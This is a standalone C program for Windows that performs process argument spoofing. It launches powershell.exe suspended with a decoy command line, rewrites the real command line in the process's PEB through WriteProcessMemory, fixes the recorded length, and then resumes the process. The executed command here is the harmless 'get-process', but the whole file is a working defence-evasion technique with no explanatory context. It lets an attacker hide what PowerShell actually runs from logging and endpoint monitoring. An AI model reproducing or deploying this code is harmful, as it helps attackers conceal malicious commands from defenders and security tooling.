#include <Windows.h>
#include <stdio.h>
#include <winternl.h>

#pragma comment(lib, "ntdll")

int main(int argc, char *argv[]) {
    CHAR* arg2run = "powershell.exe get-process";
    CHAR* spoofed_arg = "powershell.exe echo $psversiontable";

    STARTUPINFOA sinfo;
    ZeroMemory(&sinfo, sizeof(STARTUPINFOA));
    sinfo.cb = sizeof(STARTUPINFOA);
    PROCESS_INFORMATION pinfo;
    ZeroMemory(&pinfo, sizeof(PROCESS_INFORMATION));

    if (CreateProcessA(NULL, spoofed_arg, NULL, NULL, TRUE, CREATE_SUSPENDED, NULL, NULL, &sinfo, &pinfo)) {
        printf("Process Created [%lu]: '%s'\n", pinfo.dwProcessId, spoofed_arg);
        PROCESS_BASIC_INFORMATION processBasicInfo;
        DWORD errVal;
        BOOL retVal = TRUE;
        SIZE_T bytes_to_read, bytesWritten, bytesWritten2;
        PEB pebLocal;
        RTL_USER_PROCESS_PARAMETERS* parameters;
        WCHAR* spoofProcess = (WCHAR*)calloc(200, sizeof(WCHAR));
        WCHAR* responseBuff = NULL;
        CHAR* pebProcessParameters = NULL;

        NtQueryInformationProcess(pinfo.hProcess, ProcessBasicInformation, &processBasicInfo, sizeof(processBasicInfo), &errVal);
        if (!ReadProcessMemory(pinfo.hProcess, processBasicInfo.PebBaseAddress, &pebLocal, sizeof(PEB), NULL)) {
            return FALSE;
        }

        bytes_to_read = sizeof(RTL_USER_PROCESS_PARAMETERS) + 300;

        pebProcessParameters = (CHAR*)malloc(bytes_to_read);
        if (pebProcessParameters == NULL) {
            return FALSE;
        }

        if (!ReadProcessMemory(pinfo.hProcess, pebLocal.ProcessParameters, pebProcessParameters, bytes_to_read, NULL)) {
            return FALSE;
        }

        parameters = (RTL_USER_PROCESS_PARAMETERS*)pebProcessParameters;

        swprintf_s(spoofProcess, 200, L"%S\0", arg2run);
        if (!WriteProcessMemory(pinfo.hProcess, parameters->CommandLine.Buffer, spoofProcess, (wcslen(spoofProcess) + 1) * 2, &bytesWritten)) {
            return FALSE;
        }

        DWORD newUnicodeLen = (DWORD) strlen(spoofed_arg) * 2;

        if (!WriteProcessMemory(pinfo.hProcess, ((char*)pebLocal.ProcessParameters + offsetof(RTL_USER_PROCESS_PARAMETERS, CommandLine.Length)), (void*)&newUnicodeLen, 4, &bytesWritten2)) {
            return FALSE;
        }

        ResumeThread(pinfo.hThread);
        WaitForSingleObject(pinfo.hProcess, INFINITE);

        free(spoofProcess);
        spoofProcess = NULL;
        free(pebProcessParameters);
        pebProcessParameters = NULL;

        return TRUE;
    }
    return FALSE;
}